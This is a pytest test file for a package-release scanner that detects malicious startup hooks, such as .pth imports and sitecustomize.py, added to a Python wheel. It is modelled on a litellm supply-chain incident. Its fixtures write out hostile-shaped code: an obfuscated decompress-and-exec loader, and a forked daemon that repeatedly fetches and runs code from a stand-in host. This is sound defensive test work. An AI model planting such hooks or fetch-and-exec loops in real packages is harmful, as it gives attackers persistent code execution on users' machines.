"""Startup hooks a wheel installs next to the package. Synthetic trees of made-up, inert text only."""

from __future__ import annotations

import pytest

from hunter.rules import scan_release
from hunter.triage import categorize, diff_trees, pth_import_lines

OLD_PYPROJECT = (
    '[build-system]\nrequires = ["maturin>=1.5"]\nbuild-backend = "maturin"\n\n'
    '[project]\nname = "litellm"\nversion = "1.106.2"\n\n'
    '[tool.maturin]\npython-source = "python"\nmodule-name = "litellm._core"\n'
)
NEW_PYPROJECT = OLD_PYPROJECT.replace('version = "1.106.2"', 'version = "1.107.0"') + 'data = "cook"\n'
INIT = "from ._core import version\n__all__ = ['version']\n"
# Made-up stand-ins with the same shape as the incident files. The blob is not a real payload.
COOK_PTH = "import cook"
COOK_PY = "import zlib as qvzr, base64 as mtkp; exec(qvzr.decompress(mtkp.b64decode(b'AAAA')))\n"
SITECUSTOMIZE = (
    "import os, time\n"
    "from urllib.request import urlopen\n"
    "if os.fork() == 0:\n"
    "    os.setsid()\n"
    "    while True:\n"
    "        exec(urlopen('https://updates.example.invalid/c').read())\n"
    "        time.sleep(3600)\n"
)
PURELIB = "wheel/litellm-1.107.0.data/purelib/"


def _dist_info(version: str) -> dict[str, str]:
    base = f"wheel/litellm-{version}.dist-info/"
    return {
        base + "METADATA": f"Metadata-Version: 2.1\nName: litellm\nVersion: {version}\n",
        base + "WHEEL": "Wheel-Version: 1.0\nGenerator: maturin\nRoot-Is-Purelib: false\n",
        base + "RECORD": "litellm/__init__.py,,\n",
    }


def litellm_trees() -> tuple[dict[str, str], dict[str, str]]:
    """1.106.2 against 1.107.0 after archive alignment: sdist/ and wheel/ roots."""
    old = {
        "sdist/pyproject.toml": OLD_PYPROJECT,
        "sdist/python/litellm/__init__.py": INIT,
        "sdist/src/lib.rs": "fn version() {}\n",
        "wheel/litellm/__init__.py": INIT,
        "wheel/litellm/_core.cpython-312-x86_64-linux-gnu.so": "[binary-or-media-file]\nheader: elf\n",
        **_dist_info("1.106.2"),
    }
    new = {
        "sdist/pyproject.toml": NEW_PYPROJECT,
        "sdist/python/litellm/__init__.py": INIT,
        "sdist/src/lib.rs": "fn version() {}\n",
        "wheel/litellm/__init__.py": INIT,
        "wheel/litellm/_core.cpython-312-x86_64-linux-gnu.so": "[binary-or-media-file]\nheader: elf\n",
        **_dist_info("1.107.0"),
        PURELIB + "cook.pth": COOK_PTH,
        PURELIB + "cook.py": COOK_PY,
        PURELIB + "sitecustomize.py": SITECUSTOMIZE,
    }
    return old, new


def _rules_by_path(old, new) -> dict[str, set[str]]:
    found: dict[str, set[str]] = {}
    report = scan_release(old, new, ecosystem="pypi")
    for hit in report.hits:
        found.setdefault(hit.path, set()).add(hit.rule)
    return found


def test_litellm_layout_keeps_all_three_startup_files():
    old, new = litellm_trees()
    kept = {item.path: item.category for item in diff_trees(old, new)}
    assert kept[PURELIB + "cook.pth"] == "install_scripts"
    assert kept[PURELIB + "sitecustomize.py"] == "install_scripts"
    assert PURELIB + "cook.py" in kept
    assert kept["sdist/pyproject.toml"] == "install_scripts"


def test_litellm_layout_hits_the_startup_rules_on_each_startup_file():
    old, new = litellm_trees()
    report = scan_release(old, new, ecosystem="pypi")
    found = _rules_by_path(old, new)
    assert "pth_import_line" in found[PURELIB + "cook.pth"]
    assert "py_exec_decoded" in found[PURELIB + "cook.py"]
    assert {"py_startup_hook_file", "py_daemon_fetch_exec"} <= found[PURELIB + "sitecustomize.py"]
    tiers = {hit.rule: hit.tier for hit in report.hits}
    # A startup hook on its own is weak. It only counts with what the hook loads.
    assert tiers["pth_import_line"] == "weak"
    assert tiers["py_startup_hook_file"] == "weak"
    assert report.verdict == "malicious"


def test_startup_rules_skip_files_the_old_release_already_shipped():
    old, new = litellm_trees()
    found = _rules_by_path(new, {**new, "wheel/litellm/__init__.py": INIT + "x = 1\n"})
    assert not any({"pth_import_line", "py_startup_hook_file"} & rules for rules in found.values())


def test_startup_rules_skip_a_hook_that_moved_with_the_version_directory():
    old, new = litellm_trees()
    old_next = {path.replace("1.107.0", "1.106.2"): text for path, text in new.items()}
    newer = {path.replace("1.107.0", "1.107.1"): text for path, text in new.items()}
    found = _rules_by_path(old_next, newer)
    assert not any({"pth_import_line", "py_startup_hook_file"} & rules for rules in found.values())


# Third-party startup hooks the previous release already shipped, synthetic but the same shape.
PYWIN32_STYLE_PTH = "# .pth file for the PyWin32 extensions\nwin32\nwin32/lib\nPythonwin\nimport pywin32_bootstrap\n"
COVERAGE_STYLE_PTH = "import os; exec(os.environ.get('WIDGET_COVER_START') and 'import widget_cover; widget_cover.go()' or '')\n"


def _hook_release(pth_name: str, pth_text: str, new_pth_text: str | None = None):
    old = {
        "wheel/widget/__init__.py": "VERSION = '1.0'\n",
        "wheel/widget_bootstrap.py": "import os\nos.environ.setdefault('WIDGET_HOME', '')\n",
        f"wheel/{pth_name}": pth_text,
        "wheel/widget-1.0.dist-info/RECORD": "widget/__init__.py,,\n",
    }
    new = {
        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
        "wheel/widget_bootstrap.py": old["wheel/widget_bootstrap.py"],
        f"wheel/{pth_name}": pth_text if new_pth_text is None else new_pth_text,
        "wheel/widget-1.1.dist-info/RECORD": "widget/__init__.py,,\n",
    }
    return old, new


@pytest.mark.parametrize(("pth_name", "pth_text"), [("pywin32.pth", PYWIN32_STYLE_PTH), ("a1_cover.pth", COVERAGE_STYLE_PTH)])
def test_unchanged_third_party_startup_hooks_do_not_fire(pth_name, pth_text):
    old, new = _hook_release(pth_name, pth_text)
    report = scan_release(old, new, ecosystem="pypi")
    assert [hit for hit in report.hits if hit.path.endswith(".pth")] == []
    kept = {item.path: item.category for item in diff_trees(old, new)}
    assert f"wheel/{pth_name}" not in kept


def test_a_changed_pth_counts_only_its_new_import_lines():
    edited = PYWIN32_STYLE_PTH.replace("Pythonwin\n", "Pythonwin\nwin32/extra\n")
    old, new = _hook_release("pywin32.pth", PYWIN32_STYLE_PTH, edited)
    assert "pth_import_line" not in _rules_by_path(old, new).get("wheel/pywin32.pth", set())
    assert categorize("wheel/pywin32.pth", "win32/extra", edited, False) != "install_scripts"
    added = edited + "import widget_helper\n"
    old, new = _hook_release("pywin32.pth", PYWIN32_STYLE_PTH, added)
    report = scan_release(old, new, ecosystem="pypi")
    hit = next(hit for hit in report.hits if hit.rule == "pth_import_line")
    assert (hit.path, hit.line, hit.matched) == ("wheel/pywin32.pth", 7, "import widget_helper")
    assert categorize("wheel/pywin32.pth", "import widget_helper", added, False) == "install_scripts"


def test_a_changed_sitecustomize_counts_only_its_new_code_lines():
    hook = "import os\nos.environ.setdefault('WIDGET_HOME', '')\n"
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n", "wheel/sitecustomize.py": hook}
    same = {**old, "wheel/sitecustomize.py": hook + "# a comment\n"}
    assert "py_startup_hook_file" not in _rules_by_path(old, same).get("wheel/sitecustomize.py", set())
    edited = {**old, "wheel/sitecustomize.py": hook + "os.environ.setdefault('WIDGET_MODE', 'x')\n"}
    assert "py_startup_hook_file" in _rules_by_path(old, edited)["wheel/sitecustomize.py"]


# The .pth stubs written by setuptools, virtualenv, and namespace-package installs.
BENIGN_PTH = {
    "__editable__.widget-1.0.pth": (
        "import __editable___widget_1_0_finder; __editable___widget_1_0_finder.install()\n"
    ),
    "distutils-precedence.pth": (
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
        "enabled and __import__('_distutils_hack').add_shim(); \n"
    ),
    "widget_ns-1.0-py3.12-nspkg.pth": (
        "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
        "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('widget_ns',))\n"
    ),
    "_virtualenv.pth": "import _virtualenv\n",
    "widget.pth": "/home/dev/src/widget\n",
}


def test_benign_pth_stubs_do_not_hit_or_get_kept_as_install_scripts():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    for name, text in BENIGN_PTH.items():
        new = {**old, f"wheel/{name}": text}
        assert pth_import_lines(name, text) == [], name
        assert categorize(f"wheel/{name}", text, text, True) != "install_scripts", name
        found = _rules_by_path(old, new)
        assert "pth_import_line" not in found.get(f"wheel/{name}", set()), name


def test_a_stub_name_with_a_different_import_still_hits():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    new = {**old, "wheel/distutils-precedence.pth": "import helper_mod\n"}
    assert "pth_import_line" in _rules_by_path(old, new)["wheel/distutils-precedence.pth"]
    new = {**old, "wheel/_virtualenv.pth": "import _virtualenv; import helper_mod\n"}
    assert "pth_import_line" in _rules_by_path(old, new)["wheel/_virtualenv.pth"]


def test_a_new_hook_outside_the_stub_list_is_weak():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    new = {**old, "wheel/_widget_editable.pth": "import _widget_editable\n"}
    report = scan_release(old, new, ecosystem="pypi")
    assert [(hit.rule, hit.tier) for hit in report.hits] == [("pth_import_line", "weak")]
    assert report.verdict == "unsure"


def test_ordinary_wheel_without_startup_files_has_no_startup_hits():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n", "wheel/widget/core.py": "def f():\n    return 1\n"}
    new = {
        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
        "wheel/widget/core.py": "def f():\n    return 2\n",
        "wheel/widget/extra.py": "import os\n\ndef g():\n    return os.getcwd()\n",
    }
    found = _rules_by_path(old, new)
    hits = set().union(*found.values()) if found else set()
    assert not {"pth_import_line", "py_startup_hook_file", "py_daemon_fetch_exec"} & hits


def test_daemon_rule_needs_both_the_fork_and_the_fetch():
    plain_daemon = "import os\nif os.fork() == 0:\n    os.setsid()\n    exec(compile(src, 'x', 'exec'))\n"
    plain_fetch = "from urllib.request import urlopen\nexec(urlopen(U).read())\n"
    for text in (plain_daemon, plain_fetch):
        found = _rules_by_path({}, {"widget/run.py": text})
        assert "py_daemon_fetch_exec" not in found.get("widget/run.py", set())
